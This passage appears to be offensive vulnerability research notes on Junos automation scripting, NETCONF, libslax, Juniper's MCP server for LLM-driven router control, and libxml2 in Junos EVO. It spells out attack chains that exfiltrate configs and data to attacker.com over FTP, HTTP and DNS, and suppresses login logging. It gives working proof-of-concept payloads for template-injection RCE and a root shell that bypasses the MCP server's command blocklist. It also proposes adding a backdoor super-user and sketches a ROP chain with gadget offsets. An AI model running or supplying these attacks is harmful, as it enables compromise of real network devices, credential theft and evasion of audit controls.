# Junos Automation Layer Attack Surface
## Source: Junos OS Automation Scripting User Guide (2026-06-16 revision)
## Pages surveyed: 341-415

---

## Runtime Architecture

```
CLI / NETCONF / SNMP
        |
        v
   mgd daemon (management daemon)
        |
        +-- libslax (SLAX/XSLT runtime, wraps libxslt)
        |       |
        |       +-- jcs namespace (commit-scripts/1.0)
        |       +-- slax namespace (xml.libslax.org/slax)
        |       +-- curl, db, os, xutil extensions
        |
        +-- Python scripts (run as root)
        |
        v
   /var/db/scripts/{op,commit,event}/   <- writable script store
```

Script execution context: root privilege on FreeBSD kernel. SLAX runs inside `mgd`; Python scripts fork as root.

---

## Function Inventory — Attack Surface Classification

### CRITICAL: Code / Expression Injection

**`slax:evaluate(expression)` — p.376**
```slax
object slax:evaluate(expression);
// example:
var $result = slax:evaluate("expr[name == '&']");
```
- Evaluates arbitrary SLAX expression string at runtime
- If `expression` derives from NETCONF param or CLI arg: **SLAX code injection in mgd context**
- Can chain: `slax:evaluate("slax:document('http://attacker.com/payload')")`
- Introduced SLAX 1.1

**`jcs:invoke(rpc, "no-login-logout")` — p.402**
```slax
var $result = jcs:invoke(rpc, "no-login-logout");
// example:
var $sw = jcs:invoke('get-software-information');
```
- Executes any Junos XML API RPC on the **local device as root**
- `rpc` parameter: string or XML tree — if constructed from unsanitized input, **XML injection → arbitrary RPC**
- `no-login-logout` flag (added 21.1R1): **suppresses UI_LOGIN_EVENT and UI_LOGOUT_EVENT in syslog**
  - Built-in log evasion. Script executes as root with no audit trail.
- Attack chain: NETCONF param → $rpc variable → jcs:invoke($rpc)
- Introduced 7.6

**`jcs:execute(connection, rpc)` — p.377**
```slax
var $result = jcs:execute($connection, $rpc);
```
- Executes RPC on remote device over existing session
- Multiple RPCs reuse same session handle
- `rpc` controllable → arbitrary RPC on remote target
- Credentials for session commonly hardcoded in script file

### CRITICAL: SSRF / Network Reach

**`jcs:open(remote-hostname, username, passphrase, routing-instance-name)` — p.406**
```slax
// No-arg: local junoscript session
var $connection = jcs:open();
// Remote: SSH to arbitrary host
var $connection = jcs:open(remote-hostname, username, passphrase);
// Full session-options form:
var $session-options := {
    <method> "netconf";          // junoscript | netconf | junos-netconf
    <username> "admin";
    <passphrase> "test123";      // plaintext credential in script
    <port> "830";                // configurable port
    <routing-instance> "name";   // VRF selection for egress
}
var $connection = jcs:open(remote-hostname, $session-options);
```
- Opens SSH session to **attacker-controlled hostname** if param is unsanitized
- `passphrase` in plaintext as function argument — stored in `/var/db/scripts/op/*.slax`
- `routing-instance` → SSH can originate from any configured VRF (lateral movement across routing domains)
- `<port>` configurable → not limited to 830/22
- Introduced 9.3; NETCONF session support 11.4

**`slax:document(url, options)` — p.364 (confirmed prior session)**
- Reads file path OR URL
- No URL scheme restriction documented
- `slax:document("file:///etc/passwd")` — local file read
- `slax:document("http://attacker.com/")` — outbound HTTP
- Caches on first read — persistent SSRF

**`slax:get-host(address)` — p.387**
```slax
var $result = slax:get-host(address);
```
- DNS lookup for hostname, IPv4, or IPv6 — queries configured DNS server
- `address` from NETCONF input → **DNS-based exfiltration channel** (data encoded in hostname)
- Returns XML node set with `<hostname>`, `<address>`, `<alias>`
- Introduced SLAX 1.3

**`jcs:hostname(address)` — p.400**
```slax
var $name = jcs:hostname(address);
// Python: name = jcs.hostname(address)
```
- Reverse DNS lookup — same exfiltration surface as get-host
- Introduced 7.6; Python 16.1R1

### HIGH: Credential Exposure

**`jcs:get-secret(string)` — p.394**
```slax
var $password = jcs:get-secret("Enter password: ");
// Python: password = jcs.get_secret("Enter password")
```
- Silent CLI prompt (no echo)
- Returns plaintext string into script variable
- Captured credentials live in mgd process memory during execution
- If script is injectable, can redirect get-secret output to attacker-controlled connection

**Plaintext credential pattern in scripts:**
```slax
// Documented example, p.379:
var $connection = jcs:open('198.51.100.1', 'bsmith', 'test123');
// Scripts at /var/db/scripts/op/ are world-readable by default
```
- Script files at `/var/db/scripts/op/` contain hardcoded credentials
- File read access → credential harvest

### HIGH: NETCONF URL Capability

**`jcs:get-hello(connection)` — p.384-386**

Documented capability advertisement from a Junos NETCONF session:
```
urn:ietf:params:xml:ns:netconf:capability:url:1.0?protocol=http,ftp,file
```
- NETCONF `<copy-config>` accepts URL source/target with **http, ftp, file** protocols
- Config exfiltration: `<copy-config><source><url>running://</url></source><target><url>ftp://attacker.com/stolen.xml</url></target>`
- Lateral push: `<copy-config><source><url>http://attacker.com/malicious.xml</url></source><target><candidate/></target>`
- Introduced 11.4

### MEDIUM: SNMP Script Attack Surface

**`jcs.get_snmp_action()` / `jcs.get_snmp_oid()` — p.396-399**
```python
import jcs
snmp_action = jcs.get_snmp_action()   # 'get' | 'get-next' | 'set'
snmp_oid    = jcs.get_snmp_oid()      # e.g. '1.3.6.1.4.1.2636.13.61.1.9.1.1.1'
```
- Python SNMP scripts run as root
- OID string passed directly from SNMP request to script
- Action-based branching on the OID value — OID is attacker-controlled in SNMP context
- Introduced 16.1R1

**`jcs.get_input(string)` — p.389-391**
- Python: `username = jcs.get_input("Enter login id: ")`
- Null character in prompt string (`\0`) → `Invalid number of arguments` error in Python scripts
- **DoS via null byte injection** in non-interactive SNMP/event script context
- Introduced 9.4; Python 16.1R1

### LOW: String Construction Helpers (useful for injection chaining)

**`slax:join(separator, string1, string2 ...)` — p.404**
```slax
// Documented example constructs /var/db/scripts/op:
var $path = slax:join("/", "/var", "db", "scripts", "op");
```
- Useful for constructing file paths and URLs from components
- Can build arbitrary paths from partial user-controlled fragments

---

## Attack Chains

### Chain 1: NETCONF Input → Arbitrary RPC (root)
```
Attacker sends NETCONF <edit-config> with <interface-name> param
  containing XML metacharacters: </interface-name><get-system-users/>
→ SLAX script builds $rpc tree from unsanitized $interface
→ jcs:invoke($rpc)
→ Arbitrary RPC executed as root on local device
→ jcs:invoke($rpc, "no-login-logout") → no syslog audit trail
```
**Requires:** Script that passes NETCONF param to jcs:invoke without sanitization.

### Chain 2: NETCONF Input → Remote SSRF via jcs:open()
```
NETCONF param: $target = "attacker.com"
Script: var $conn = jcs:open($target, "admin", $password)
→ SSH connection from Junos device to attacker.com:22
→ Attacker captures: SSH client version, host key fingerprint, username
→ If $password also from NETCONF input: full credential exfiltration over SSH
→ jcs:execute($conn, <get-route-information/>) → attacker controls RPC response
```
**Routing instance param → exfiltration from non-default VRF.**

### Chain 3: SLAX Dynamic Evaluation → Full Extension Access
```
NETCONF param: $expr = "slax:document('http://attacker.com/c2')"
Script: var $r = slax:evaluate($expr)
→ mgd makes outbound HTTP request to attacker C2
→ C2 responds with SLAX expression: "jcs:invoke('request-shell-execute')"
→ Shell execution as root (if RPC exposed)
```
**One param + slax:evaluate → full script runtime compromise.**

### Chain 4: NETCONF URL Capability → Config Exfiltration
```
Authenticated NETCONF session (any user with netconf access):
<copy-config>
  <source><running/></source>
  <target><url>ftp://attacker.com/device-config.xml</url></target>
</copy-config>
→ Complete running config (including password hashes) sent to attacker FTP
```
**Auth required but low-privilege NETCONF user sufficient. No script needed.**

### Chain 5: Script File Read → Credential Harvest
```
/var/db/scripts/op/ accessible with file read (local or via slax:document())
→ *.slax files contain: jcs:open("router1", "admin", "test123")
→ Plaintext service account credentials for lateral movement to adjacent devices
```

### Chain 6: DNS Exfiltration via slax:get-host()
```
NETCONF param: $data = <b64-encoded-data>.attacker.com
Script: slax:get-host($data)
→ DNS query to attacker nameserver with data in label
→ Exfiltrate arbitrary data over DNS (bypasses HTTP proxy controls)
```

---

## Log Evasion

`jcs:invoke(rpc, "no-login-logout")` suppresses:
- `UI_LOGIN_EVENT`
- `UI_LOGOUT_EVENT`

This is a **vendor-documented log suppression parameter** added in Junos OS Release 21.1R1. Scripts using this flag execute as root with RPC results but without auth event log entries. Commit and event scripts only (not op scripts).

---

## Writable Paths

| Path | Content | Risk |
|------|---------|------|
| `/var/db/scripts/op/` | Op scripts (run on demand) | Plaintext creds; if writable = persistence |
| `/var/db/scripts/commit/` | Commit scripts (run on every commit) | Writable = root exec on every config change |
| `/var/db/scripts/event/` | Event scripts (triggered by syslog events) | Writable = trigger-based root exec |
| `/var/run/` | jcs:dampen() state files | Low-privilege write, timing oracle |

---

## Functions Confirmed NOT Yet Analyzed (still pending)

| Function | Page | Priority |
|----------|------|----------|
| `jcs:sleep()` | 427 | Low |
| `jcs:sysctl()` | 431 | Medium (kernel parameter read) |
| `jcs:syslog()` | 433 | Medium (log injection) |
| `jcs:trace()` | 438 | Low |
| Remote script source | 469 | CRITICAL (supply chain) |
| libslax curl extension | 218 | HIGH (HTTP client) |

---

---

## Source RE — libslax Confirmations

Cloned: `github.com/Juniper/libslax` (depth=1, 2026-08-30)

### `slaxExtEvaluate` — libslax/slaxext.c:2852-2884

```c
str = xmlXPathPopString(ctxt);
// SLAX-to-XPath translation (syntactic only, no value sanitization)
sexpr = slaxSlaxToXpath("slax:evaluate", 1, (const char *) str, &errors);
// Direct eval — no sandbox, no expression restrictions
ret = xmlXPathEval((const xmlChar *) sexpr, ctxt->context);
```

`slaxSlaxToXpath` converts SLAX syntax to XPath. It does NOT sanitize or restrict
what the expression can access. `xmlXPathEval()` has full document tree access.
If `str` comes from NETCONF input, Chain 3 is confirmed at source level.

### `ext_os` — extensions/os/ext_os.c:1339-1384

OS extension functions available from any SLAX script running as root in mgd:

| Function | Signature | Impact |
|----------|-----------|--------|
| `os:mkdir` | `(path)` | Create arbitrary directories |
| `os:stat` | `(file-spec)` | Stat any file — filesystem enumeration |
| `os:remove` | `(filespec, ...)` | Delete arbitrary files |
| `os:chmod` | `(permissions, filespec, ...)` | Change permissions on any file |
| `os:chown` | `(ownership, file-spec, ...)` | Change ownership |
| `os:user-info` | `()` | Current process user info |
| `os:exit-code` | `(number)` | Set process exit code |

All run in mgd context = root. `os:remove` + `os:chmod` = file-based privilege
escalation primitives from any injectable SLAX script.

---

## Junos MCP Server — `github.com/Juniper/junos-mcp-server`

Official Juniper-published MCP server for LLM-to-router interaction. FastMCP
framework, PyEZ backend. 9 tools. Analyzed 2026-08-30.

### CRITICAL: Jinja2 SSTI → RCE on MCP Host

**File:** `jmcp.py:1352-1358`

```python
env = Environment(
    trim_blocks=True,
    lstrip_blocks=True,
    autoescape=False,          # no HTML escaping
    undefined=StrictUndefined,
)
rendered_config = env.from_string(template_content).render(variables)
```

`template_content` is supplied directly by the MCP client (LLM). No sandbox.
Standard `Environment()`, not `SandboxedEnvironment`. Exploitable before
`apply_config` check — render-only mode is sufficient.

**PoC (no router required):**
```
tool: render_and_apply_j2_template
template_content: "{{ ''.__class__.__mro__[2].__subclasses__()[128].__init__.__globals__['system']('id') }}"
vars_content: "x: 1"
apply_config: false
```

**Impact:** RCE on the host running the MCP server. If the server is co-located
with device credentials in `devices.json`, this becomes full device compromise
with no NETCONF/SSH authentication needed.

### CRITICAL: `execute_junos_command` shell bypass

**File:** `block.cmd` — 5 blocked patterns:
```
request system reboot
request system halt
request system power-cycle
request system power-off
request system zeroize
```

NOT blocked: `request system shell`, `file show /etc/master.passwd`,
`request routing-engine login`, PFE commands, any `show` command.

**PoC:**
```json
{"router_name": "r1", "command": "request system shell command \"id\""}
```

Root shell on FreeBSD Junos device.

### CRITICAL: `execute_junos_pfe_command` — no blocklist

`_run_junos_pfe_command` calls `junos_device.rpc.request_pfe_execute(target, command)`
with no blocklist check. PFE commands execute below the OS on the packet forwarding
ASIC. Can dump FIB, modify forwarding tables, access ASIC memory.

### HIGH: `get_junos_config` — full config disclosure

Hardcoded command: `show configuration | display inheritance no-comments | display set | no-more`

Returns complete device configuration including plaintext password hashes to any
authenticated MCP client. No access scoping.

### HIGH: `block.cfg` incomplete — user persistence

Blocked: `set system root-authentication`, `set system login user ([^ ]+) authentication`

NOT blocked: `set system login user BACKDOOR class super-user` (adds user without auth =
SSH key injection path if user subsequently sets their key via unblocked command path).

### Token storage

Default token file: `.tokens` in server working directory. Format documented in
README. If world-readable (Docker default volumes), provides MCP API access.

---

## libxml2.so.3 in Junos EVO — CVE Status

Library: `libxml2.so.3` from Junos EVO 23.4R2.14 ISO initrd, not stripped.
Embedded version: `20909` = libxml2 **2.9.9**.

| CVE | Fixed in upstream | Status in 2.9.9 |
|-----|------------------|-----------------|
| CVE-2021-3541 (billion laughs) | 2.9.11 | PATCHED — Juniper backported. `xmlParserEntityCheck` at 0xef6b0: `cmp r13, 0x98967f` (10MB) + ×10 document size limit |
| CVE-2022-23308 (XInclude UAF) | 2.9.14 | **CONFIRMED UNPATCHED** — NULL guard absent at two access sites |

`xmlXIncludeDoProcess` UAF analysis (0x7b550, x86-64 ELF, not stripped):

Entry guards (present):
- `0x7b564`: `test %rsi, %rsi; je 7cddc` — doc == NULL check
- `0x7b574`: `test %rdx, %rdx; je 7cddc` — tree == NULL check
- `0x7b580`: `cmpl $0x12, 0x8(%rdx); je 7cddc` — tree->type != XML_NAMESPACE_DECL
- `0x7b58d`: `test %rdi, %rdi; je 7cddc` — ctxt == NULL check

UAF site 1 (0x7c9d4–0x7c9e6):
```
7c9d4:  test  %rbx, %rbx           ; node != NULL (guards the node pointer)
7c9d7:  je    7ca2f                 ; ← only guards node itself
7c9d9:  cmpl  $0x1, 0x8(%rbx)      ; node->type == XML_ELEMENT_NODE
7c9dd:  jne   7c9d0
7c9df:  mov   0x40(%rbx), %rdi     ; ← rdi = node->doc — NO NULL CHECK
7c9e3:  mov   %rbx, %rsi
7c9e6:  call  xmlNodeGetBase        ; xmlNodeGetBase(node->doc, node)
```
`node->doc` is loaded and passed directly to `xmlNodeGetBase` without a
`node->doc == NULL` guard. If doc was freed by a prior XInclude substitution,
this is a UAF deref.

UAF site 2 (0x7c9f7–0x7ca05):
```
7c9f7:  mov   0x40(%rbx), %rax     ; rax = node->doc (second read, no guard)
7c9fe:  mov   0x88(%rax), %rsi     ; rsi = doc->URL — deref of potentially freed doc
7ca05:  call  xmlStrEqual
```
`doc->URL` (at offset 0x88 in xmlDoc) dereferenced from a potentially-freed doc pointer.

Additional sites (r13 node, no NULL guard on doc):
  0x7c542, 0x7c6c2, 0x7cab5 — all `mov 0x40(%r13), %rdi` → `call xmlNewDocNode`

Fix in 2.9.14: adds `if (node->doc == NULL) goto out;` before 0x7c9df equivalent.
This check is absent in 2.9.9.

Trigger path in Junos context: CONFIRMED UNREACHABLE via NETCONF.
  Binary verification (EVO 23.4R2.14): mgd imports xmlReadFile only (config file I/O).
  libengine.so.1 imports: xmlFreeDoc, xmlReadFile, xmlSaveClose, xmlSaveDoc, xmlSaveToFd.
  Neither mgd nor libengine imports xmlXIncludeProcessFlags, xmlXIncludeProcess, or any
  xmlXInclude* variant. NETCONF XML is processed by Junos internal xml_* parser stack,
  NOT libxml2 SAX/DOM. The UAF site in xmlXIncludeDoProcess is present but unreachable
  from any NETCONF input path — no code path from TCP session to xmlXIncludeDoProcess.
  Status: UAF confirmed in binary, trigger path confirmed absent.

  SEPARATE TRIGGER NEEDED: xmlXInclude only triggers if attacker can load a crafted
  XML document via xmlReadFile (e.g., config load from file) and the file contains
  XInclude hrefs. Requires write access to config file path — post-auth or local.

`xmlLoadExtDtdDefaultValue` exported — external DTD loading compiled in.
  DTD external entity path also requires xmlReadFile, same constraints as above.

## Juniper custom DOM API: register_* / cs_xmlXPathNext* (NULL deref + vtable overwrite)

12 Juniper-specific BSS function pointer slots added to libxml2.so.3 (absent in upstream).
Confirmed via RELA.dyn relocation table (.got section, Junos EVO 23.4R2.14 x86-64 libxml2.so.3).

TWO-LEVEL INDIRECTION: function pointers stored in BSS at 0x150b10+.
  .got section (0x14dbb8–0x14dea8) holds R_X86_64_GLOB_DAT relocations → resolved at load
  time to the BSS variable addresses. Code access: mov rax,[GOT_entry] → rax=BSS addr,
  then call [rax] (= call *(BSS addr) = call the stored function pointer).

Full vtable (BSS variable address = write target; GOT entry = PIC access point):
```
BSS addr   Name               GOT entry   Register stub  Stub VA
0x150b10   get_first_node     0x14dbc0    register_get_first_node       0x2f4c0
0x150b18   get_all_nodeset    0x14dc08    register_get_all_nodeset      0x2f560
0x150b20   is_node_container  0x14dc18    register_is_node_container    0x2f510
0x150b28   get_ref_node       0x14dd18    register_get_ref_node         0x2f550
0x150b30   delete_node        0x14dd38    register_delete_node          0x2f530
0x150b38   is_node_equal      0x14dd50    register_is_node_equal        0x2f520
0x150b40   get_child_node     0x14ddb8    register_get_child_node       0x2f4e0
0x150b48   get_next_node      0x14dde8    register_get_next_node        0x2f4d0
0x150b50   delete_nodeset     0x14de30    register_delete_nodeset       0x2f570
0x150b58   get_parent_node    0x14de38    register_get_parent_node      0x2f4f0
0x150b60   get_all_nodes      0x14de58    register_get_all_nodes        0x2f500
0x150b68   delete_all_nodes   0x14de98    register_delete_all_nodes     0x2f540
```
12 slots, 8 bytes each. All in a single contiguous BSS block 0x150b10–0x150b6f.

Registration stubs are 3 instructions each — no type checking, no atomicity guarantee:
```asm
; register_get_first_node(fn):  fn in rdi
0x2f4c0:  mov  rax, [rip + 0x11e6f9]  ; rax = 0x14dbc0 (GOT entry for get_first_node)
0x2f4c7:  mov  [rax], rdi             ; *(0x14dbc0) = fn  [but GOT→0x150b10, so writes fn to BSS!]
0x2f4ca:  ret
```
NOTE: GOT[0x14dbc0] was resolved by linker to 0x150b10 (BSS addr of get_first_node).
So `mov [rax], rdi` writes fn into BSS at 0x150b10 — correct write target.
Pattern repeats identically for all 12 slots.

cs_xmlXPathNextParent (0x81700) — walks "commit-script-input" / "configuration" elements:
  (GOT entries used; BSS variable at each GOT target is the actual write/call target)
  0x81790:  mov r13, [rip+0xcc6a1]     ; r13 = GOT[get_parent_node]=0x14de38 → BSS 0x150b58
  0x8179a:  call qword [r13]           ; call *(BSS 0x150b58) — NO NULL CHECK
  0x817a8:  mov rax, [rip+0xcc469]     ; rax = GOT[is_node_container]=0x14dc18 → BSS 0x150b20
  0x817b2:  call qword [rax]           ; call *(BSS 0x150b20) — NO NULL CHECK
  0x817bb:  call qword [r13]           ; call *(BSS 0x150b58) again — NO NULL CHECK
  0x817c5:  mov rax, [rip+0xcc56c]     ; rax = GOT[delete_node]=0x14dd38 → BSS 0x150b30
  0x817cf:  call qword [rax]           ; call *(BSS 0x150b30) — NO NULL CHECK
  0x817d6:  mov rax, [rip+0xcc3e3]     ; rax = GOT[get_first_node]=0x14dbc0 → BSS 0x150b10
  0x817ec:  jmp  qword [rax]           ; tail-call *(BSS 0x150b10) — NO NULL CHECK
  Unchecked BSS slots: get_parent_node(0x150b58), is_node_container(0x150b20),
    delete_node(0x150b30), get_first_node(0x150b10) — 4 unchecked call sites

cs_xmlXPathNextChildElement (0x81870) — Junos child-element axis traversal:
  Element-name check: `repe cmpsb` at 0x8190e against "commit-script-input" (0x113d9a)
  0x81923:  mov rax, [rip+0xcc296]     ; rax = GOT[get_first_node]=0x14dbc0 → BSS 0x150b10
  0x8192a:  call qword [rax]           ; call *(BSS 0x150b10) — NO NULL CHECK
  0x81938:  mov rax, [rip+0xcc4f9]     ; rax = GOT[get_parent_node]=0x14de38 → BSS 0x150b58
  0x81942:  call qword [rax]           ; call *(BSS 0x150b58) — NO NULL CHECK
  0x8194f:  mov rax, [rip+0xcc2c2]     ; rax = GOT[is_node_container]=0x14dc18 → BSS 0x150b20
  0x81956:  call qword [rax]           ; call *(BSS 0x150b20) — NO NULL CHECK
  0x81964:  mov rbx, [rip+0xcc3cd]     ; rbx = GOT[delete_node]=0x14dd38 → BSS 0x150b30
  0x8196e:  call qword [rbx]           ; call *(BSS 0x150b30) — NO NULL CHECK
  0x8197f:  mov rax, [rip+0xcc432]     ; rax = GOT[get_child_node]=0x14ddb8 → BSS 0x150b40
  0x81994:  jmp  qword [rax]           ; tail-call *(BSS 0x150b40) — NO NULL CHECK
  Unchecked BSS slots: get_first_node, get_parent_node, is_node_container,
    delete_node, get_child_node — 5 unchecked call sites

CONFIRMED: 9 of 12 BSS slots have no NULL guard across the two custom axis functions.
BSS slot layout is contiguous (0x150b10–0x150b6f, 96 bytes). Highest-value overwrite target:
  delete_node (BSS 0x150b30): 15+ call sites in xmlXPathNodeCollectAndTest + cs_* functions.

NOTE on xmlXPathNodeCollectAndTest NULL checks: at 0x8f941/0x8f94b, the code does
  `mov rax, [GOT_for_delete_node]; test rax, rax; je skip` — this tests the GOT address
  (resolved at load time to 0x150b30, always non-null). It does NOT test the stored
  function pointer at *(0x150b30). The "NULL check" is INEFFECTIVE — the branch is never
  taken, and a NULL stored pointer still crashes at the call.

Dispatch gates in xmlXPathNodeCollectAndTest — BOTH confirmed proper stored-ptr check:

Parent-axis gate (0x8fabe):
```asm
0x8fabe: mov  rax, [rip + 0xbe323]    ; rax = GOT[get_next_node]=0x14dde8 → 0x150b48
0x8fac5: lea  rdx, [rip - 0xe9dc]     ; rdx = &xmlXPathNextParent (standard safe)
0x8facc: cmp  qword ptr [rax], 0      ; *(BSS 0x150b48) == 0? — PROPER stored-ptr check
0x8fad0: lea  rax, [rip - 0xe3d7]     ; rax = &cs_xmlXPathNextParent (Juniper)
0x8fad7: cmove rax, rdx               ; NULL → standard; non-NULL → Juniper custom
```

Child-element-axis gate (0x8fc11):
```asm
0x8fc11: mov  rax, [rip + 0xbe1d0]    ; rax = GOT[get_next_node]=0x14dde8 → 0x150b48
0x8fc18: lea  rdx, [rip - 0xe73f]     ; rdx = &xmlXPathNextChildElement (standard, 0x814e0)
0x8fc1f: cmp  qword ptr [rax], 0      ; *(BSS 0x150b48) == 0? — PROPER stored-ptr check
0x8fc23: lea  rax, [rip - 0xe3ba]     ; rax = &cs_xmlXPathNextChildElement (Juniper, 0x81870)
0x8fc2a: cmove rax, rdx               ; NULL → standard; non-NULL → Juniper custom
```
Both gates key on get_next_node only. Once inside cs_* functions, the other 11 slots are unchecked.

NOTE on ineffective check at xmlXPathNodeCollectAndTest delete_node call sites (0x8f941/0x8f94b):
  `mov rax, [rip + 0xbe3f0]` → rax = GOT[delete_node] → 0x150b30 (BSS addr, always non-null)
  `test rax, rax; je 0x8f955` → tests the GOT→BSS address (always non-null) — INEFFECTIVE
  `call [rax]` → calls *(0x150b30) — crashes if delete_node not registered (BSS still NULL)
  This path runs even when cs_xmlXPathNextParent is not the dispatch target.

FINDING 1 — NULL deref (partial-registration race):
  Precondition: `register_get_next_node(fn)` has been called (gate passes),
    but {get_parent_node | is_node_container | delete_node | get_first_node} still NULL.
  Trigger: NETCONF XPath filter with parent/child-element axis:
    `<filter type="xpath" select="parent::configuration">` →
    xmlXPathNodeCollectAndTest → cmove takes cs_* path (get_next_node != NULL) →
    cs_xmlXPathNextParent → call *get_parent_node (NULL) → crash at 0x0.
  Window: any XPath query arriving between first register_* call and last register_* call.
  Severity: DoS / crash of mgd (management daemon).

BSS layout adjacent to vtable (from nm + symbol table):
```
0x150b00: xmlParserInitialized    (int)
0x150b08: xmlEntityRefFunc        ← function pointer, 8 bytes before vtable
0x150b10: get_first_node          ← VTABLE START
0x150b18: get_all_nodeset
...
0x150b68: delete_all_nodes        ← VTABLE END
0x150b70: [8 bytes padding/unknown]
0x150b80: sw_version              ← software version ptr, just past vtable
```
Overflow primitive landing at 0x150b08 corrupts xmlEntityRefFunc first, then all 12 vtable slots.
xmlEntityRefFunc call sites confirmed at 0xff06b and 0xff090:
  0xff06b: mov rax, [rip + 0x51a96]  ; rax = *xmlEntityRefFunc (BSS direct load)
  0xff072: test rax, rax              ; PROPER null guard — non-null required to trigger
  0xff075: je skip                    ; if not registered, skip
  0xff07d: mov rdi, r13
  0xff080: call rax                   ; call xmlEntityRefFunc(parser_ctx, ?, 0)
Both call sites properly null-check the stored value, so overwriting with non-null immediately
triggers the call during XML entity reference processing. Reachable from any NETCONF XML
input containing `&entity_name;` references — no authentication bypass needed once in session.
Chain: BSS overflow → xmlEntityRefFunc → arbitrary code execution (mgd/root context)
  AND: vtable[0x150b10-0x150b68] → XPath traversal → arbitrary code execution

FINDING 2 — vtable overwrite (RCE):
  BSS vtable at confirmed offsets relative to library load base (ASLR randomizes the
  base, but inter-segment layout is fixed — vtable-to-GOT delta is constant).
  Target: delete_node BSS at 0x150b30 (load-base-relative offset 0x150b30).
    delete_node called at 15+ sites; always reached on any XPath traversal.
  Contiguous BSS block: 0x150b10–0x150b6f (96 bytes, 12 slots).
    Overwrite any one slot → code execution on next XPath query that calls it.
  Overwrite mechanism: requires write-what-where to BSS.
  NOTE: CVE-2022-23308 (xmlXIncludeDoProcess UAF) was previously listed here —
    INCORRECT. CVE-2022-23308 affects libxml2 2.9.10-2.9.12. This binary is
    libxml2 2.9.9 (xmlParserVersion='20909'). CVE-2022-23308 does NOT apply.

  WRITE PRIMITIVE SEARCH (exhaustive, EVO 23.4R2.14):
    Surveyed all 46 strcpy sites in libengine.so.1 — all follow strlen→malloc→strcpy pattern
      (safe by construction) or alloca→strcpy (stack-local, cannot reach libxml2 BSS).
    Surveyed all 13 sprintf sites in libengine.so.1 — all use constant format strings
      (RIP-relative literal addresses); no attacker-controlled format string found.
    CVE-2021-3517 (stack overflow in xmlEncodeEntitiesInternal): function at 0xc8570 contains
      dynamic buffer growth via PLT call 0x2c530 (xmlBufferGrow); fixed (backported by Juniper,
      build date 2024-06-26 well post-2021 fix).
    XInclude UAF trigger: CONFIRMED ABSENT (see UAF section above — mgd imports no XInclude fn).
    XPath write-primitive via register_* reuse: cscript calls register_delete_node(cs_delete_node)
      with compile-time constant — not data-driven, no controllable argument path.
    All register_* calls in cscript ext_register_all (0x11e60) use lea rdx,[rip+const]
      (function pointers from cscript .text section) — closed against injection.

  Write primitive to BSS: NO CONFIRMED PATH in EVO 23.4R2 after exhaustive binary survey.

  HIGHEST-VALUE REMAINING WRITE PRIMITIVE HYPOTHESIS:
    If an attacker can install a SLAX commit/op script (requires initial config write access,
    e.g., via F2-level credentials), the slax:evaluate chain with a hand-crafted slax:invoke
    to a custom mgd extension could call register_delete_node(fp) where fp is a controlled
    address. This chain requires existing config write access — degrades FINDING 2 to post-auth
    privilege escalation, not standalone pre-auth RCE.

  Trigger (after overwrite): any NETCONF XPath filter with child-element or parent axis:
    xmlXPathNodeCollectAndTest → cs_xmlXPathNextChildElement/Parent → call *(BSS slot)
    → arbitrary code execution in mgd context (root on FreeBSD/Junos EVO).
  MITIGATION POSTURE (EVO 23.4R2.14, binary-verified):
    NX:     ON  — GNU_STACK flags = RW (not RWX); shellcode injection path closed.
    PIE:    ON  — mgd = ET_DYN; libengine = ET_DYN. ASLR active on EVO. Load bases
                  randomized at process start. Inter-library delta constant within process.
    RELRO:  OFF — GOT writable on mgd and libengine (confirmed: no PT_GNU_RELRO segment).
    Canary: NOT PRESENT — function prologues in libengine use push/sub, no FS:0x28 load.

  ASLR bypass analysis (EVO 23.4R2.14):
    Kernel default: randomize_va_space = 2 (full ASLR — no sysctl override in EVO
    config). All segments randomized for PIE executables.
    NETCONF pointer leak survey: 14 format strings containing %p in libengine.so.1.
    ALL route to js_traceout (PLT 0x37ef0) = Junos tracefile, NOT NETCONF channel.
    No %p-format path found that writes to the NETCONF wire reply.
    Confirmed absence: no xmlGetLastError()->str1 pointer reflected to client;
    gram_file_report_error formats to 8KB stack buf → dprintf with no pointer fields.
    CONCLUSION: No NETCONF-visible pointer leak identified. ASLR bypass requires
      either a second vulnerability (info-leak class) or offline core analysis.
      Without bypass, FINDING 2's RCE component is theoretical — chain incomplete.
    Net: FINDING 2 = post-auth privilege escalation (config write → vtable overwrite
      → ROP when ASLR bypass available), not pre-auth RCE.

  ROP GADGET LANDSCAPE (libengine.so.1, load-base-relative offsets):
    pop rdi; ret             @ 0x5b18d
    pop rsi; pop rbp; ret   @ 0x3bb37  (nearest single pop rsi)
    pop rdx; ret             @ 0x3ed0f
    pop rcx; ret             @ 0x5141e
    pop rax; ret             @ 0x333c8
    pop rsp; ret             @ 0xa8220  (stack pivot — pivot RSP to attacker-controlled buf)
    pop rbp; ret             @ 0x3bb38
    system@PLT               @ 0x35ec0  (system(3) imported: U system@GLIBC_2.2.5)
    execv@PLT                @ 0x3b3c0  (execv(2) imported: U execv@GLIBC_2.2.5)

  CHAIN SKETCH — system("/bin/sh") via vtable overwrite (load-base-relative):
    Requires: write primitive to BSS 0x150b30 in libxml2.so.3 (FINDING 2 precondition);
              libengine base address leak for gadget offsets.
    Step 1: Place "/bin/sh\x00" at a known writable addr (e.g., BSS+fixed-offset in
            libengine: 0x25c4a0 region is GOT-adjacent and writable, or use heap spray).
    ROP chain written to BSS or heap (any writable, non-execute region):
      [libengine_base + 0x5b18d]   # pop rdi; ret
      [addr_of_binsh_str]           # rdi = "/bin/sh"
      [libengine_base + 0x35ec0]   # call system@PLT -> system("/bin/sh")
    Overwrite BSS[0x150b30] with addr of ROP chain start (needs stack pivot first
    if vtable slot dispatches via call, not jmp).
    Trigger: send NETCONF RPC with XPath filter containing child:: or parent:: axis.

---

## libslax source RE — slax:* extension attack surface

Source: github.com/Juniper/libslax (open-source SLAX runtime).
Registration: slaxExtRegister() at slaxext.c:3764 registers all slax:* functions.

FINDING S1 — slax:evaluate → arbitrary XPath injection (slaxext.c:2862)
  ```c
  sexpr = slaxSlaxToXpath("slax:evaluate", 1, (const char *) str, &errors);
  ret = xmlXPathEval((const xmlChar *) sexpr, ctxt->context);
  ```
  `str` = first argument, popped from XPath context stack. If a SLAX script passes
  a NETCONF RPC parameter directly: `var $r = slax:evaluate($rpc-param);`
  → attacker controls the XPath expression evaluated against the current document.
  Current document during NETCONF processing = parsed running config + RPC payload.
  XPath extraction: `//configuration/system/login/user/authentication/ssh-rsa`
  → reads SSH keys, passwords, RADIUS secrets from running config.
  No sandboxing between the injected expression and the config document tree.

FINDING S2 — slax:document → LFI/SSRF (slaxext.c:3203)
  ```c
  filename = xmlXPathPopString(ctxt);   // attacker-controlled
